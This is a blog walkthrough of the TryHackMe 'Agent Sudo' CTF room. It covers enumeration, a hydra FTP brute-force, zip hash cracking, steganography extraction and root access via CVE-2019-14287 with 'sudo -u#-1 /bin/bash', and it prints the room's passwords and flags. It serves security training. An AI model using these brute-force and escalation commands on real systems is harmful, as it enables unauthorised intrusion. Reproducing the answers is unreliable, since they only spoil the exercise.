---
title: "Challenges: Agent Sudo (TryHackMe)"
datePublished: Tue Jun 24 2025 20:42:49 GMT+0000 (Coordinated Universal Time)
cuid: cmcazscsb000602kz7254d5uf
slug: challenges-agent-sudo-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1750797592575/5834349a-3353-4468-8316-fede66f9bd04.png
tags: steganography, tryhackme, cve, sudo, ctf-writeup, brute-force, privilege-escalation

---

Welcome to my walkthrough of the [**Agent Sudo**](https://tryhackme.com/room/agentsudoctf) room on TryHackMe — a CTF that tests your ability to pivot through enumeration, hash cracking, steganography, and privilege escalation. This challenge blends web recon, curiosity-driven digging, and a touch of real-world OSINT. Throughout this write-up, I’ll walk through the steps I took to discover hidden agents, crack credentials, uncover secrets buried in images, and finally gain root access by exploiting a known vulnerability.

Let’s jump in and dissect the mystery one flag at a time. 👇

## Author note

![](https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png align="left")

Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!  
  
If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.

## Enumerate

Enumerate the machine and get all the important information

### Answer the questions below

1. How many open ports? `3`  
      
    `nmap -sV <IP_Address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750773629663/51d95bd6-b63e-4807-9795-e282526e80d4.png align="center")
    
2. How do you redirect yourself to a secret page? `user-agent`  
      
    One thing about cybersecurity is that one has to be curious and willing to explore every possibility of where to find the flag, expected answer, solve the problem, or identify a vulnerability. For this case, checking gobuster doesn’t reveal it, but checking the site http://&lt;IP\_Address&gt; on the browser
    
      
    `gobuster dir -u <IP_Address> -w /usr/share/wordlists/dirb/common.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750773673878/5b92fad7-15f8-46c4-abab-72917538d5b8.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750773730251/20ee7304-66f3-47d9-bfc9-a82de4e4c453.png align="center")
    
3. What is the agent name? `chris`  
      
    I tried navigating around but couldn’t find the name. With some research, I learned that Burp Suite would be an option, but it didn’t work for my case  
      
    Eventually, this revealed the name: `curl -A "C" -L http://<ip_address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750773840463/838c1ff1-0343-48da-92c9-18630e8d6d38.png align="center")
    

  

### Details about curl -A "C" -L http://&lt;ip\_address&gt; properties

| Part | What it does |
| --- | --- |
| `curl` | The command-line tool used to make HTTP requests. |
| `-A "C"` | Sets the **User-Agent** header to `"C"`, as required by the challenge. This tricks the server into thinking you're a specific "agent." |
| `-L` | **Follow redirects**. If the server responds with a `301` or `302` (redirect), curl follows the redirect automatically. |
| `<ip_address>` | The target web server (e.g., [`http://10.10.150.81`](http://10.10.150.81)). |

---

### 🧠 Why `-L` was Needed

When you first visit a site like `http://<ip>`, it might return a **redirect** to another page (like `/secret` or `/agent/landing`). Without `-L`, curl just shows you the `Location:` header and stops. With `-L`, curl **follows** the redirection and retrieves the final page.

You can test it yourself by omitting `-L`:

```markdown
bashCopyEditcurl -A "C" http://<ip_address>
```

You’ll likely see something like:

```markdown
pgsqlCopyEditHTTP/1.1 302 Found
Location: /agent-page
```

But with `-L`curl follows it and shows you the actual page contents.

---

### ✅ Summary on `curl -A "C" -L`

  
👉 Sets the **user-agent** to `"C"` (to satisfy the challenge requirement)  
👉 **Follows redirects** to reach the actual content  
👉 ✅ Successfully bypasses the protection and gives you the page meant for agent "C"

## Hash cracking and brute-force

Done enumerate the machine? Time to brute your way out.

### Answer the questions below

1. FTP password `crystal`  
      
    `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<IP_Address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750789822389/2656becd-cc50-4961-ab5a-f38e8de6007a.png align="center")
    
2. Zip file password `alien`  
      
    $ `ftp <IP_ADDRESS>`
    
    Enter username(chris) and password (FTP password)
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750790146861/8a65cfa7-f6db-4c89-b0fc-39b174793a84.png align="center")
    
    `$ mget *`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750790315347/469d8cae-0794-45ce-a369-4dd11cfcd5ca.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750790658194/564f1320-69b3-4dd9-bfba-03d19534c017.png align="center")
    
    We are now able to access the files through the root folder. Steghide and other libraries were not helpful, but binwalk was helpful, but we had to uninstall and install Capstone if you experience issues like we did.  
      
    `sudo pip3 uninstall capstone`  
    
    `sudo pip3 install capstone==4.0.2`  
      
    `binwalk -e cutie.png`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750791145046/5aac7360-81bc-4bbd-837b-495048d28a7d.png align="center")
    
    Now we have the `_cutie.png.extracted` which has the zip file we’re looking for. Here are the next steps:  
      
    `ls _cutie.png.extracted`  
    
    `cd _cutie.png.extracted`  
      
    `zip2john` [`8702.zip`](http://8702.zip) `> zip_hash.txt` `ls` `cat zip_hash.txt john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750792021544/4cfbf684-ca6d-4806-b372-e3012664271c.png align="center")
    
3. steg password `Area51`  
      
    tried different tools, [7-Zip](https://www.7-zip.org/) worked eventually, and I was able to view the `txt` file. It revealed a hash, and I used [CyberChef](https://gchq.github.io/CyberChef/) to convert from base64.  
      
    `sudo apt install p7zip-full`  
      
    `7z x -palien 8702.zip`  
      
    // note `-palien` stands for `-p` and password (`alien`)  
      
    `cat To_agentR.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750792235076/713ee8ce-c2fd-4e09-abdd-d888a7ee10ed.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750794979463/990e1870-121c-4186-b9f3-d4d5b22fe78a.png align="center")
    
4. Who is the other agent (in full name)? `james`  
      
    `steghide extract -sf cute-alien-jpg`  
      
    `cat message.txt`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750796226476/ae815d54-8d58-4ccd-8f71-8fe6cc2d2b32.png align="center")
    
5. SSH password `hackerrules!`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750796303013/1dd4c8a3-3b43-432f-8e1d-0253e5afc029.png align="center")
    
      
    

## Capture the user flag

You know the drill.

### Answer the questions below

1. What is the user flag? `b03d975e8c92a7c04146cfa7a5a313c7`  
      
    Since we got the SSH password in the previous task and knew the name of the user (james) we’ll use SSH to switch to user james’ privileges to access the user flag and escalate privileges in the next steps
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750796408060/39fdfe10-81ab-459e-8398-2ff384473999.png align="center")
    
2. What is the incident of the photo called? `Roswell alien autopsy`  
      
    We had to download the image we saw within James’s user into the root user in order to reverse search it using Google, and using some OSINT search skills, we were able to find the incident as reported by Fox News  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750796574864/170b15fd-a0d0-494b-befa-06713254a609.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750796673895/c3feeaa9-369b-4a66-a9de-2e91e06ac5a0.png align="center")
    
    After uploading the image to Google reverse image search, these were the exact matches that came up, and reading through most of the article, we see a hint of alien, Area 51, and Roswell. Next step is to Google search ones linked to ‘area 51 + alien + roswell + foxnews’, whichever format you’ll use to search. A couple of Fox News articles come up, but the one that stood out is this one
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750796870812/702b06e3-65f5-45d6-ac51-5aea9d5d199d.png align="center")
    
      
    

## Privilege escalation

Enough with the extraordinary stuff? Time to get real.

### Answer the questions below

1. CVE number for the escalation 
    
    (Format: CVE-xxxx-xxxx) `CVE-2019-14287`  
      
    tried the hostnamectl among other options to find a clue to the [CVE](https://www.exploit-db.com/exploits/47502). Eventually, I came across this `sudo -l`. Using the result, especially the command hint at the bottom, you’ll find this [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
    
    as part of the web results. Checking the exploit you’ll see that it has both the commands you see on james and on the root results of `sudo -l`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750797058092/393d1ec1-385e-49a8-8c80-607808e6c7bd.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750797081091/64097d58-bf7c-426e-a6ba-c25ab4cac99d.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750797110491/cff2b5ab-8282-46cc-ab47-918a2ed61513.png align="center")
    
    When you find the CVE yo
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750797181834/53325606-55b6-4b13-92fa-15c4d12d733f.png align="center")
    
    To escalate privileges with the help of the CVE and what we have, when we use:  
      
    `sudo -u#-1 /bin/bash`  
      
    Privileges are escalated to root, and we can now find the file that has the root flag
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750772955311/05fc69f5-00c0-4352-8d95-8b3ff2d16b3a.png align="center")
    
2. What is the root flag? `b53a02f55b57d4439e3341834d70c062`  
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750772948845/1d2dde6e-19ee-4dbb-8c76-b2fcba21154e.png align="center")
    
3. (Bonus) Who is Agent R? `DesKel`
    

This room was a solid reminder that good enumeration and a questioning mindset are key in CTFs. From manipulating User-Agents and extracting files from images, to tracking agents through OSINT and exploiting CVE-2019-14287 for privilege escalation, Agent Sudo proved that creativity matters just as much as technical skill.

Thanks for checking out my write-up — and as always, stay curious, keep learning, and happy hacking! Until next time. 🚀